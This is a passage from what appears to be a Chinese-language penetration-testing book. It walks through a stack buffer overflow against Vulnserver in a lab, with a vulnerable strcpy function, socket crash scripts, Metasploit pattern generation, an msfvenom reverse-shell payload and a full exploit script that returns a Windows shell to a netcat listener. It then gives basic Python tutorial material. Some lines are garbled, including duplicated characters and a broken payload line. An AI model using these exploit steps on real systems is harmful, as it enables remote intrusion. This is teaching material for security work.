  \ |7769F94E Nùiw RETURN to ntdll.7769F94E from ntdll.7769F960\n0061FEA8 |0061FED8\
  \ Øþa.\n```\n\n### 栈溢出 (Stack Overflow)\n\n在本章中，我们开发了 C 程序（`SimpleBuffer.c`），因为它容易受到栈溢出攻击。这就是普通开发者与安全分析师之间的区别。除非开发者接受过相关训练，或者有人以前告诉过他如何修复，否则他无法发现这里的栈溢出。仔细查看复制函数：\n\
  \n```\n void copy(char* message)\n{\n // 声明一个字符数组\n char buffer[15];\n\n // 将消息复制到缓冲区数组中\n\
  \ strcpy(buffer, message);\n}\n```\n\n它接收一个 `message` 参数，那么是谁在控制这个函数的输入呢？你猜到了吗？是用户通过命令行控制。但如果那个用户是一个黑客呢？\n\
  \n如果你仔细观察这个函数，你会看到一个声明的固定缓冲区数组，大小限制为 15。现在，如果用户发送了超过 15 个字节怎么办？该轮到我们利用它了！\n\n让我们打开\
  \ immunity debugger 并加载同一个程序，但这次我们要戴上黑客帽子，尝试粉碎栈。好了，让我们通过在参数字段（而不是 ABCD）中输入大量的 A（至少超过\
  \ 15 个）来尝试攻击程序，并点击 Open（选择字母 A 是随机的；也可以是 B 或 C 等）。接下来，我们将点击 Run，它应该停落在我们之前的断点处：\n\
  \n```\n 004015E9 |. C74424 1C 0100>MOV DWORD PTR SS:[ESP+1C],1\n```\n\n在这个阶段，我们将在缓冲区复制的行之后的\
  \ NOP 指令处再添加一个断点：\n\n```\n 004015D3 |. E8 DC0F0000 CALL <JMP.&msvcrt.strcpy> \n\
  004015D8 |. 90 NOP\n```\n\n一旦设置好断点，点击 Run 执行并停在 NOP 指令处。你猜怎么着？我们刚刚用大量的 A 溢出了栈：\n\
  \n```\n 0061FE84 00B10EC8 È±. ASCII \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\
  \n0061FE88 0061FFCC Ìÿa.\n0061FE8C 74E3CCC0 ÀÌãt msvrt.74E3CCC0\n0061FE90 414141D3\
  \ óAAA\n0061FE94 41414141 AAAA\n0061FE98 41414141 AAAA\n0061FE9C 41414141 AAAA\n\
  0061FEA0 41414141 AAAA\n0061FEA4 41414141 AAAA\n0061FEA8 41414141 AAAA\n0061FEAC\
  \ 41414141 AAAA\n0061FEB0 41414141 AAAA\n```\n\n[图 16.5] 显示了我们点击 Run 时发生的情况。\n\n\
  ![错误消息截图。](img/c16f005.png)\n\n[图 16.5] 错误消息\n\n看看这个有趣信息；它在像婴儿一样哭泣：“我不知道如何继续，因为地址\
  \ 414141 内存不可读。”当然了，它是不可读的！那是一个无效地址。想象一下，如果我们不是在指令指针中注入这些 A，而是输入一个有效的地址，而在那个地址中，我们的\
  \ shellcode 正在等待执行。朋友们，这就是黑客利用栈的方法。在接下来的章节中，我们将看到如何实际操作。\n\n### 栈溢出机制\n\n当我们用 A\
  \ 填充栈时，到底发生了什么？最关键的问题是，为什么 EIP 被填充了 A？（为什么不是 EBX 或 ECX 等？）最简单的回答是，每个函数（例如我们 C 程序中的\
  \ copy 函数）都需要将返回地址存储在 EIP 寄存器中，而这个值值将临时存储在栈/缓冲区中，如[图 16.6]所示。\n\n由于缓冲区限制为 15 字节，当我们提供更多数据时，我们就会覆盖相邻的内存，包括存储在栈上的返回地址。这允许我们将执行流重定向到我们选择的地址。\n\
  \n\n\n\n\n```python\n#Import the network socket library\nimport socket\n\n# send\
  \ 10 A's to the server\ntest = \"A\" * 10 \ntry:\n    # create a socket object to\
  \ connect with the server \n    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\
  \    conn=s.connect(('172.16.0.102',9999))\n    # wait for the server to respond\n\
  \    s.recv(1024)\n    #send input\n    s.send('TRUN /.:/' + test)\n    #Wait and\
  \ receive some data\n    s.recv(1024)\n    print (\"Success\")\n#If an error/exception\
  \ occurs, then execute this line\nexcept:\n    print (\"Error Occured\")\nfinally:\n\
  \    #close connection\n    s.close()\n```\n\n当我们运行 Python 脚本时，显示成功消息，说明正常路径（happy\
  \ path）测试已成功：\n\n```\nroot@kali:~/BFO# python Happy_test.py \nSuccess\n```\n\n##\
  \ 测试崩溃\n\n我们不再只发送 10 个 A，而是发送 10K 个 A 来崩溃服务器（我们在开始缓冲区溢出测试时使用的 10K 个 A 只是一个随机数，以确保我们能够让崩溃）：\n\
  \n```python\nimport socket\nimport sys\n\n# send 10000 A's to the server\ncrash\
  \ = \"A\" * 10000 \n\ntry:\n    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\
  \    conn=s.connect(('172.16.0.102',9999))\n    s.recv(1024)\n    s.send('TRUN /.:/'\
  \ + crash)\n    s.recv(1024)\nexcept:\n    print (\"Error Occured\")\nsys.exit(0)\n\
  finally:\n    s.close()\n```\n\n运行之前的 Python 脚本将导致远程服务器崩溃：\n\n```\nroot@kali:~/BFO#\
  \ python crash.py \nError Occurred\n```\n\n## 2 阶段：缓冲区大小\n\n我们的下一个目标是估算栈的缓冲区大小。为什么？因为我们想知道\
  \ EIP 所在的位置（参考图 16.6），这样我们就可以插入汇编指令指向我们的负载执行（我们将在第 3 阶段完成）。\n\n### 模式创建\n\n我们将使用\
  \ Metasploit 生成智能字符来定位 EIP。通过评估缓冲区大小，我们将知道 EIP 的精确位置（因为它就在它旁边）。在 Metasploit 中，有一个为此此目的设计的工具叫做\
  \ `pattern_create`，它位于 Kali 中的以下路径：\n\n```\n/usr/share/Metasploit-framework/tools/exploit/pattern_create.rb\n\
  ```\n\n接下来，我们将更改终端窗口中的当前目录并执行该工具。该程序将模式长度作为输入；如果你记得，我们创建了 10,000，所以我们将使用相同的数字来生成模式（你不会在这里看到工具生成的完整模式，因为它太大了，无法显示）：\n\
  \n```\nroot@kali:/usr/share/Metasploit-framework/tools/exploit# ./pattern_create.rb\
  \ -l 10000\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9A… \n```\n\n### 偏移量定位\n\n在 Metasploit\
  \ 生成负载后，我们将将其复制到之前的 Python 脚本中并发送到服务器。我们还不会执行它；你很快就会知道为什么：\n\n```python\nimport\
  \ socket\nimport sys\n\n# send the payload generated by Metasploit to the server\n\
  msf_chunk = \"Aa0Aa1Aa2Aa3Aa4..\" \n\ntry:\n    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\
  \    conn=s.connect(('172.16.0.102',9999))\n    s.recv(1024)\n    s.send('TRUN /.:/'\
  \ + msf_chunk)\n    s.recv(1024)\nexcept:\n    print (\"Error Occured\")\n    sys.exit(0)\n\
  finally:\n    s.close()\n```\n\n在执行 Python 脚本之前，确保 Vulnserver 在 Windows 主机上运行（记得我们之前让它崩溃了，所以你需要重启应用程序）。接下来，我们将运行\
  \ Immunity Debugger，通过点击 File 菜单并在列表中选择 Attach 来附加 Vulnserver 进程。将打开一个窗口，我们将从列表中选择应用程序（它叫\
  \ Vulnserver）。一旦点击 Attach，Immunity 将被暂停。在此阶段，我们将点击 Run，状态将从 Paused 变为 Running（见\
  \ Immunity 右下角的区域）。现在是执行 Python 脚本并查看会发生什么了：\n\n```\nroot@kali:~/BFO# python msf_chunk.py\n\
  ```\n\nPython 程序在此阶段应该挂起，但通过仔细观察 Windows 主机，我能够在 Immunity 内部的 Registers 窗口窗口看到一些很有前景的结果：\n\
  \n```\nEAX 00A8F1E8 ASCII \"TRUN /.:/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af88Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4\n\
  ECX 00E55118\nEDX 00006BD7\nEBX 000000C0\nESP 00A8F9C8 ASCII \"Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6\n\
  ```\n\n\n\n\n\n在我们进入 shellcode 部分之前，你必须学会如何处理我们找到的那个地址。还记得上一章中的小端序（little-endian）原理吗？事实上，在下一节的\
  \ Python 代码中，我们将对 EIP 使用以下取值：`\\xAF\\x11\\x50\\x62`。\n\nPython 中的 `\\x` 表示这是一个十六进制值，其余部分是真实地址值的反序（这就是小端序的工作原理）。\n\
  \n## 第 4 阶段：注入 Payload 并获取远程 Shell\n\n是时候见证成果了。你兴奋吗？这是我们为 Windows 受害者主主机获取远程 Shell\
  \ 的时刻。为了让这一步生效，首先我们将使用 `MSFvenom` 生成一个反弹 shell payload。在第二步，我们将 Payload 数据复制到 Python\
  \ 脚本中。最后，我们将启动监听器并执行我们的 Python 脚本。让我们实际操作一下！\n\n#### Payload 生成\n\n让我们使用 Metasploit\
  \ 的 `MSFvenom` 生成一个反弹 shell payload：\n\n```\n root@kali:~# msfvenom -p windows/shell_reverse_tcp\
  \ LHOST=172.16.0.103 LPORT=1111 -a x86 -b \"\\x00\" -f python\n[-] No platform was\
  \ selected, choosing Msf::Module::Platform::Windows from the payload\nFound 11 compatible\
  \ encoders\nAttempting to encode payload with 1 iterations of x86/shikata_ga_nai\n\
  x86/shikata_ga_nai succeeded with size 351 (iteration=0)\nx86/shikata_ga_nai chosen\
  \ with final size 351\nPayload size: 351 bytes\nFinal size of python file: 1712\
  \ bytes\nbuf = b\"\"\nbuf += b\"\\xba\\x1e\\x11\\x43\\xb1\\xdb\\xda\\xd9\\x74\\\
  x24\\xf4\\x5e\\x2b\"\nbuf += b\"\\xc9\\xb1\\x52\\x31\\x56\\x12\\x83\\xee\\xfc\\\
  x03\\x48\\x1f\\xa1\"\nbuf += b\"\\x44\\x88\\xf7\\xa7\\xa7\\x70\\x08\\xc8\\x2e\\\
  x95\\x39\\xc8\\x55\"\nbuf += b\"\\xde\\x6a\\xf8\\x1e\\xb2\\x86\\x73\\x72\\x26\\\
  x1c\\xf1\\x5b\\x49\"\nbuf += b\"\\x95\\xbc\\xbd\\x64\\x26\\xec\\xfe\\xe7\\xa4\\\
  xef\\xd2\\xc7\\x95\"\n[…]\n```\n\n在上一条命令中，我们使用了以下选项：\n\n* `-p` (payload)：Windows\
  \ 反弹 shell。\n* `LHOST` ：Kali 的 IP 地址。\n* `LPORT` ： 我们在监听器上使用的端口号。\n* `-a` (architecture)：x86。\n\
  * `-b` (bad character)：我们希望从 payload 中排除坏字符 `\\x00`。坏字符会导致 shellcode 执行失败。\n* `-f`\
  \ (output format)：Python 格式。\n\n#### 坏字符\n\n现在你知道坏字符会导致 payload 失败，但远不止于此。那么为什么\
  \ `\\x00` 是坏字符呢？主原因是操作系统会将其处理为 `NULL` 字节。它并不是唯一被视为坏字符的字符，但我们将其作为默认。如果你想将缓冲区溢出推向极致，你还需要注意以下坏字符（坏字符比列表中的多，但这些是常见的）：\n\
  \n* `\\x0D` ：回车符\n* `\\xFF` ：分页符\n* `\\x0A` ：换行符\n* `\\x00` ： `NULL`\n\n#### Shellcode\
  \ Python 脚本\n\n使用 `MSFvenom` 生成 shellcode 后，现在可以将将其作为 payload 发送到远程服务器。另外注意，在添加\
  \ shellcode 之前，我们会添加一些 NOP 滑滑块（32 个）：\n\n```\n import socket\nimport sys\nbuf =\
  \ b\"\"\nbuf += b\"\\xba\\x1e\\x11\\x43\\xb1\\xdb\\xda\\xd9\\x74\\x24\\xf4\\x5e\\\
  x2b\nbuf += b\"\\xc9\\xb1\\x52\\x31\\x56\\x12\\x83\\xee\\xfc\\x03\\x48\\x1f\\xa1\"\
  \nbuf += b\"\\x44\\x88\\xf7\\xa7\\xa7\\x70\\x08\\xc8\\x2e\\x95\\x39\\xc8\\x55\"\n\
  buf += b\"\\xde\\x6a\\xf8\\x1e\\xb2\\x86\\x73\\x72\\x26\\x1c\\xf1\\x5b\\x49\"\n\
  buf += b\"\\x95\\xbc\\xbd\\x64\\x26\\xec\\xfe\\xe7\\xa4\\xef\\xd2\\xc7\\x95\"\n\
  buf += b\"\\x3f\\x27\\x06\\xd1\\x22\\xca\\x5a\\x8a\\x29\\x79\\x4a\\xbf\\\nx64\"\n\
  buf += b\"\\x42\\xe1\\xf3\\x69\\xc2\\x16\\x43\\x8b\\xe3\\x89\\df\\xd2\\x23\"\nbuf\
  \ += b\"\\x28\\x33\\x6f\\x6a\\x32\\x64\"\n[...]\n# shellcode = \"\\x90\" * 32 +\
  \ buf\n# Payload address to JMP ESP\npayload = \"A\" * 2003 + \"\\xAF\\x11\\x50\\\
  x62\" + shellcode\n\ntry:\n    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\
  \    s.connect(('172.16.0.102',9999))\n    s.recv(1024)\n    s.send(payload)\n \
  \   s.recv(1024)\nexcept:\n    print (\"Error Occured\")\n    sys.exit(0)\nfinally:\n\
  \    s.close()\n```\n\n保存 Python 脚本后，执行以下步骤：\n\n1. 在 Windows 主机上，确保 `Vulnserver.exe`\
  \ 正在运行。\n2. 我们在练习中不用 Immunity；我们只需要一个远程 shell。\n3. 在 Kali 上启动监听器（`nc -nlvp 1111`）。\n\
  4. 执行 Python 脚本，你应该就能获得 shell！\n\n```\nroot@kali:~# nc -nlvp 1111\nlistening on\
  \ [any]\nconnect to [172.16.0.103] from (UNKNOWN) [172.16.0.102] 50339\nMicrosoft\
  \ Windows [Version 10.0.19041.630]\n(c) 2020 Microsoft Corporation. All rights reserved.\n\
  C:\\Users\\Gus\\Downloads\\vulnserver-master>whoami\nwhoami\n```\n\n### 总结\n\n在本章中，你看到了利用栈的一种方法，但这并不是唯一的方法。还有其他技术，如结构化异常处理器（SEH）和蛋蛋（Egghunter）。作为渗透人员，你经常会遇到这类练习。如果你的专业领域是漏洞利用，你可以探索更高级的技术（这些超出了本书范围）。在下一章中，我们将介绍\
  \ Python 语言的基础。\n\n## 第 17 章：Python 编程\n\nPython 是黑客的首选语言；它简单且强大。这种神奇的编程语言为构建攻击工具提供了极佳的平台。猜怎么着？你可以在\
  \ Windows、Mac 或 Linux 等任何平台上使用它。太棒了！\n\n在本章中，你将学习以下 Pythoner：\n\n* 在 Kali 上安装和使用\
  \ Python 调试器\n* Python 脚本\n* 变量类型\n* 如何声明函数\n* 如何处理循环\n* 如何使用条件\n* 如何实现错误处理\n* 如何创建类\n\
  \n#### Python 基础\n\n你可能会问为什么选择 Python？这一部分可以帮助你做决定。让我们先进行比较。当你比较选择时，最好进行某种分类。假设你喜欢汉堡，但你的朋友\
  \ John 喜欢披萨；这两个选项都属于快餐类，如果你想吃希腊沙拉，那属于沙拉类。这与我们的工作有什么关系？编程语言的选择也有分类。\n\n例如，如果你想开发商业\
  \ Web 应用，最好使用 `C#` 或 `Java`（有时是 `PHP`）等编程语言。开发 Web 应用你还需要了解前端的 `JavaScript`。请注意，我是根据在组织中看到的常见模式选择这些语言的；总有例外（所以选择你喜欢的语言即可）。\n\
  \n如果你想开发硬件驱动程序，那么你需要深入研究 `C++` 和汇编语言。\n\n现在是渗透测试的分类。首先，你需要了解 Python 和 `Bash` 脚本的基础（我们已经在第\
  \ 2 章“Bash 脚本”中涵盖过了）。你还没有结束；你还需要学习 `C` 语言基础和汇编指令，用于逆向工程和低级技能（我们在在前两章中涵盖过）。\n\n####\
  \ 运行 Python 脚本\n\n要执行 Python 脚本，你通常打开终端窗口并输入关键字 `python`，后跟 Python 脚本的文件名/路径：\n\n\
  ```\nroot@kali:~#python [python_file.py]\n```\n\n执行 Python 脚本的另一种方法是使用以下模式：\n\n\
  ```\nroot@kali:~#[python_file.py]\n```\n\n这里我们假设两点：首先你处于脚本文件所在的目录（（在终端窗口中），并且你通过以下命令为文件赋予了正确的权限：\n\
  \n```\nroot@kali:~#chmod +x [python_file.py]\n```\n\n第三好的选择是直接输入 Python 文件名：\n\n\
  ```\nroot@kali:~#[python_file.py]\n```\n\n\n\n\n\n如果你想以那种方式执行脚本，你需要将该目录（你保存脚本的目录）添加到\
  \ `PATH` 变量中。我们已经在第 2 章中详细介绍过这一点，该章节介绍了 Bash 脚本语言。\n\n## 调试 Python 脚本\n\n在某个时刻，你将编写一个大型\
  \ Python 脚本来帮助你实现渗透测试目标。在这种情况下，你需要一个集成开发环境（IDE）软件，以便调试并捕获编程错误。在本章和下一章中，我们在 Kali\
  \ Linux 上使用 `Visual Studio Code`。在下一节中，你将看到如何在我们喜爱的操作系统 Kali Linux 上安装此 IDE。\n\n\
  ### 在 Kali 上安装 VS Code\n\n微软产品终于兼容 Linux 是一件很棒的事。过去，这只是一个梦想，在基于 Linux 的操作系统上运行 Windows\
  \ 应用是一件麻烦。要下载 VS code 的安装文件，请使用以下 URL：[code.visualstudio.com/download](http://code.visualstudio.com/download)。\n\
  \n下载完成后，打开终端并将当前目录更改到 Downloads 文件夹（因为应用程序就在那里）。在终端窗口中执行以下命令（文件名在 VS Code 的后续版本中可能会不同）：\n\
  \n```\nroot@kali:~/Downloads# dpkg -i code_1.51.1-1605051630_amd64.deb \nSelecting\
  \ previously unselected package code.\n(Reading database … 345247 files and directories\
  \ currently installed.)\nPreparing to unpack code_1.51.1-1605051630_amd64.deb …\n\
  Unpacking code (1.51.1-1605051630) …\nSetting up code (1.51.1-1605051630) …\nProcessing\
  \ triggers for desktop-file-utils (0.24-1) …\nProcessing triggers for mime-support\
  \ (3.64) …\nProcessing triggers for shared-mime-info (1.15-1) …\n```\n\n安装完成后，转到\
  \ Kali 菜单，在查找框中输入应用程序名称（参见图 17.1），你将在搜索结果中看到它。\n\n![运行 VS Code 的截图。](img/c17f001.png)\n\
  \n图 17.1  VS Code\n\n在我们开始编写 Python 脚本之前，还需要做的最后一个更改。我们必须添加 Python 扩展！为了完成任务，在扩展面板中输入\
  \ `Python`，它应该显示在顶部（参见图 17.2）。\n\n![Python 扩展的截图。](img/c17f002.png)\n\n图 17.2 Python\
  \ 扩展\n\n最后，点击 Install 按钮安装此扩展。当你创建第一个 Python 脚本时，VS Code 屏幕底部弹出一个消息，提示你安装 `pylint`（参见图\
  \ 17.3），这就是开始使用此 IDE 进行 Python 编程的唯一剩余工作了。\n\n![pylint 的截图。](img/c17f003.png)\n\n\
  图 17.3 Pylint\n\n## 练习 Python\n\n请注意，在本章中我们将涵盖 Python 版本 3+。遗憾的是，版本 2 不再受支持，但你仍然可以使用它；语法上没有巨大差异。尽管如此，如果你想快速练习\
  \ Python 场景怎么办？答案是 Kali Linux 内置的 Python 解释器。要运行它，只需在终端窗口中输入 `python3`，就会提示解释器（如果你只输入\
  \ Python，则将执行 Python2 解释器）：\n\n```\nroot@kali:~# python3\nPython 3.8.3 (default,\
  \ May 14 2020, 11:03:12) \n[GCC 9.3.0] on Linux\nType \"help\", \"copyright\", \"\
  credits\" or \"license\" for more information.\n>>>\n```\n\n在这个阶段，你可以快速测试任何你想测试的内容。让我们声明字符串变量\
  \ `text`（称为 `message`）并使用 `print` 函数将其打印到屏幕上。之后，我们将使用 `exit()` 命令退出 Python 解释器窗口：\n\
  \n```\nroot@kali:~# python3\nPython 3.8.3 (default, May 14 2020, 11:03:12) \n\n\
  [GCC 9.3.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for\
  \ more information.\n>>> message=\"Hello Friends!\"\n>>> print (message)\nHello\
  \ Friends!\n>>> exit()\nroot@kali:~#\n```\n\n## Python 基础语法\n\n在继续本章内容之前，你需要了解 Python\
  \ 中的一些标准语法和模式。本节将展示处理 Python 语言的所有流行方式；让我们开始吧！\n\n### Python Shebang\n\nPython shebang\
  \ 是通过将 Python 解释器路径添加到本地主机（Kali Linux）来实现的。核心思想是将文件作为脚本运行，并定义脚本的版本（Python 2 或 3）。你必须在\
  \ Python 脚本文件的顶部添加 shebang。\n\n```python\n#!/usr/bin/python3\nprint (\"Let's Hack!\"\
  )\n```\n\n在之前的脚本中，我们正在指示操作系统（Kali Linux）使用 `Python3`。此外，如果有一天我们把此代码分享给其他人，他们也会知道。在脚本开头添加\
  \ shebang 不是强制性的，但根据我在本节开头给出的定义，这样做很好。\n\n### Python 中的注释\n\n要在 Python 脚本中添加注释，你必须使用井号\
  \ `#`。异常情况是，我们之前使用的 shebang 不被视为注释，但脚本其余部分的井号会被视为。\n\n```python\n#!/usr/bin/python3\n\
  \n# 向用户打印消息\n#[Todo] 稍后添加更多逻辑\nprint (\"Let's Hack!\")\n```\n\n### 行缩进和导入模块\n\n\
  Python 中需要理解的另一个关键概念是如何指示新行源代码逻辑的开始（你很快就会通过示例理解）。这通常发生在条件或迭代（以及更多）之后，我们将在本章后面的部分看到。在下面的示例中，我们将使用\
  \ `try` / `except` 语句在文件未正常打开时捕获错误（你将在本章稍后详细查看错误处理是如何工作的）。如果发生这种情况，将会有消息指示发生了错误。注意，我们在\
  \ `try` 语法之后和 `except` 语法之后使用制表符进行行缩进。\n\n本节中需要理解的第二个概念是在 Python 中导入其他模块（我们有时称之为库）。模块是你在脚本内部使用的库。例如，当发生错误时，你希望应用程序退出。为了完成任务，你可以使用\
  \ `sys.exit()` 函数。但为了实现目标，你必须先在脚本顶部使用 `import` 语法导入 `sys` 模块：\n\n```python\n#!/usr/bin/python3\n\
  import sys\n\ntry:\n      # 在这一行我使用了制表符进行缩进\nopen_file=open(\"/usr/share/wordlists/nmap.lst\"\
  )\n# 这里也使用了制表符\n      print (\"File opened successfully!\")\nexcept:\n      # 这里使用了制表符\n\
  \      print (\"cannot open the file\")\n      # 这里也是\n      sys.exit(0)\n```\n\n\
  ### 输入与输出\n\n在 Python 中，你可以通过终端窗口向脚本输入数据。为了使其工作，你必须使用输入语法并将其值存储在变量中。如果你想使用 Python\
  \ 版本 2，请使用 `raw_input`，它始终保持变量类型为字符串。相反，如果你使用 input 函数，Python 解释器将动态判断类型（当你想要用户使用\
  \ Python 版本 2 输入非字符串数据类型时使用 input 函数）。\n\n在输出部分，大多数时候你会使用 `print` 函数后跟你想在屏幕上显示的的文本消息：\n\
  \n```python\n#!/usr/bin/python3\n\nip_address = input(“Enter the IP address that\
  \ you want to scan: “)\nprint(“the IP address is: “ + ip_address)\n```\n\n#### 打印命令行参数\n\
  \n\n\n\n在在上一个示例中，我们使用交互式的方法来获取用户的某些输入。情况并非总是如此；你可以通过 `sys.argv` 函数来读取 CLI 参数。第一个\
  \ `argv` 索引 `argv[0]` 将返回应用程序的名称，随后的索引将返回参数值：\n\n```python\n#!/usr/bin/python3\n\
  import sys\n\nprint (\"The application name is: %s\" % (sys.argv[0]))\nprint (\"\
  The first argument value is: %s\" % (sys.argv[1]))\n```\n\n当运行此脚本（我将其保存为 `temp.py`）并带有参数\
  \ `H@K3R$` 时，其输出将如下所示：\n\n```\nroot@kali:~/pythonLab# python temp.py H@K3R$\nThe\
  \ application name is: temp.py\nThe first argument value is: H@K3R$\n```\n\n## 变量\n\
  \n变量在任何编程语言中（不仅仅是 Python）都用于在内存中存储临时数据。变量的主要目的是在源文件中复用它。\n\n在 Python 中，我们有多种类型的变量。最常见的如下：\n\
  \n* **数字 (Numbers)**：将存储数字\n* **字符串 (Strings)**：将存储文本\n* **列表 (Lists)**：将存储值的数组集合\n\
  * **元组 (Tuples)**：将存储只读数组项\n* **字典 (Dictionaries)**：将存储键值对\n\n### 数字\n\n数字将存储在此类型的变量中。让我们来看一个如何使用\
  \ Python 存储数字的示例。在下面的示例中，我们将创建一个变量来保存我们想要扫描的端口号，然后将其值打印到屏幕上。但在打印到屏幕之前，我们将使用 `str`\
  \ 函数将数字转换为字符串。加号 `+` 用于拼接字符串（加号不作为加法符号）。换句话说，你不能将字符串附加到整数上；在打印到屏幕之前必须先转换为字符串：\n\n\
  ```python\nport_number = 80\nprint (\"The port number is \" + str(port_number))\n\
  ```\n\n我们将打开 Visual Studio Code，通过选择“文件 (File)”菜单并点击“新建 (New File)”项创建一个新文件。接下来，在新文件中，我们将编写之前的\
  \ Python 脚本。要执行并调试脚本，我们将使用键盘上的 `F5` 键（或选择“运行 (Run)”菜单并点击“运行 ➪ 开始调试”项）。之后，调试窗口将打开以选择配置选项；在我们的情况下，它是一个\
  \ Python 文件（参见图 17.4）。\n\n![调试屏幕截图。](img/c17f004.png)\n\nFigure 17.4 调试\n\n如果一切正常（没有输入错误），屏幕底部的终端标签页应显示图\
  \ 17.5 所示的结果。\n\n![输出屏幕截图。](img/c17f005.png)\n\n图 17.5 输出\n\n恭喜！这是你第一个使用专业 IDE 编写的官方\
  \ Python 脚本。\n\n### 算术运算符\n\n在某些场景，你将对数值进行算术运算（加法、减法等）。如果是这样，你需要了解允许你进行算术运算的运算符列表，如表\
  \ 17.1 所示。\n\n| 运算符符号 | 示例 | 描述 |\n| --- | --- | --- |\n| `+` | `num1+ num2` | 两个或多个数字相加\
  \ |\n| `‐` | `num1‐ num2` | 两个或多个数字相减 |\n| `*` | `num1* num2` | 两个或多个数字相乘 |\n| `/`\
  \ | `num1/ num2` | 两个或多个数字相除 |\n| `**` | `num1** num2` | 计算两个或多个数字的幂 |\n| `%` |\
  \ `num1% num2` | 计算两个或多个数字除法结果余数（模） |\n\n表 17.1 算术运算符\n\n### 字符串\n\n在字符串变量中，你可以存储文本值。你可以通过三种方式在变量中存储文本：\n\
  \n* 使用单引号\n```python\nstr1 = '10.0.0.1'\n```\n\n* 使用双引号\n```python\nstr2 = \"10.0.0.2\"\
  \n```\n\n* 使用三引号（用于多行）\n```python\nstr3 = \"\"\"我们想要扫描的 Windows\n主机的 IP 地址是 10.0.0.100\"\
  \"\"\n```\n\n#### 字符串格式化\n\n为了适当格式化字符串，你需要使用格式 `%` 运算符。在数字示例中，我们使用加号将整数附加到短语（字符串）上。但更优的方法是通过百分比运算符，如下：\n\
  \n```python\nport_number = 80\nprint (\"The port number is %d\" % port_number)\n\
  ```\n\n`%d` 代表有符号十进制整数。在使用字符串格式化器时，还有许多需要注意的转换符号（参见表 17.2）。\n\n| 符号 | 描述 |\n| ---\
  \ | --- |\n| `%d` | 有符号十进制数 |\n| `%x` 或 `%X` | 十六整数 |\n| `%e` 或 `%E` | 指数形式 |\n\
  | `%f` | 浮点数 |\n| `%c` | 字符 |\n| `%s` | 字符串文本 |\n\n表 17.2 字符串格式化器\n\n#### 字符串函数\n\
  \n在某些场景，你可能想对字符串运行函数，例如，如果你想知道字符串变量的长度等等。有很多字符串函数，但表 17.3 列出了最常见的函数（事实上，比这些多得多；如果你想了解更多，请访问为此目的提供的在线资源）。\n\
  \n在表 17.3 的示例中，我们将使用以下字符串变量：\n\n```python\nstr = '10.0.0.1'\n```\n\n| 函数 | 描述 |\
  \ 示例 |\n| --- | --- | --- |\n| `len(string)` | 返回字符串值的长度。 | `>>> len(str)` `8` |\n\
  | `replace(old value, new value)` | 用另一个值替换现有值。 | `>>> str.replace('.1','.0')` `'10.0.0.0'`\
  \ |\n| `split(delimiter)` | 使用分隔符将字符串文本值拆分为子字符串数组（你很快就会看到如何处理数组）。 | `>>> str.split('.')`\
  \ `['10', '0', '0', '1']` |\n| `strip` | 移除开头和结尾的字符。对于移除字典文件中的额外空格非常有用。 | `>>> str.strip()`\
  \ `'10.0.0.1'` |\n| `Find` | 在字符串中查找任何出现的位置。如果查找成功，则返回起始索引；否则将返回 -1。 | `>>> str.find('.’)`\
  \ `6` |\n| `Count` | 计算一个值在字符串中出现的次数。 | `>>> str.count(‘.’)` `3` |\n\n表 17.3 字符串函数\n\
  \n### 列表\n\n列表变量是不同类型值的集合（字符串、整数等）。列表中的每个项都有索引，且从 0 开始。在下面的示例中，我们声明了一个列表变量来存储我们要扫描的所有端口号：\n\
  \n```python\n>>> list_ports=[21,22,80,443]\n>>> list_ports[0]\n21\n```\n\n#### 读取列表值\n\
  \n读取列表中的单个项，必须使用其索引，例如（基于之前的变量 `list_ports`）：\n\n```python\n>>> list_ports[1]\n\
  22\n```\n\n读取列表中的多个项，必须遵循公式 `[起始索引 : 结束索引]`，并注意结束索引是不包含的。这是一个示例：\n\n```python\n\
  >>> list_ports[0:3]\n[21, 22, 80]\n```\n\n#### 更新列表项\n\n你可以更改列表变量的内容。要完成工作，只需指定要更改的值的索引：\n\
  \n```python\n>>> list_ports[0]='FTP'\n>>> list_ports\n['FTP', 22, 80, 443]\n```\n\
  \n#### 移除列表项\n\n要移除列表项，必须使用 `del` 关键字并识别其索引。要从 `list_ports` 列表中移除端口 443，你需要执行以下命令：\n\
  \n```python\n>>> del list_ports[3]\n>>> list_ports\n['FTP', 22, 80]\n```\n\n###\
  \ 元组\n\n元组类似于列表，但主要区别是元组是只读的，不能更改。当你想要声明元组变量时，必须使用括号包裹值：\n\n```python\n>>> tuple_ports=(21,22,80,443)\n\
  >>> tuple_ports[0]\n21\n```\n\n### 字典\n\n字典变量将包含一组键值对，每个对之间由冒号 `:` 字符隔开。最好的示例是使用端口号示例来可视化这种类型的工作方式：\n\
  \n\n\n\n\n```\n >>> dic_ports = { 'FTP':21, 'HTTP':80 }\n>>> dic_ports['FTP']\n\
  21\n```\n\n# Python 中的更多技术\n\n我们刚刚接触了如何处理 Python 的基础知识。在接下来的章节中，我们将涵盖更高级的编程概念，帮助你使用这种优秀的语言构建程序。请注意，在下一章中，我将向你如何使用\
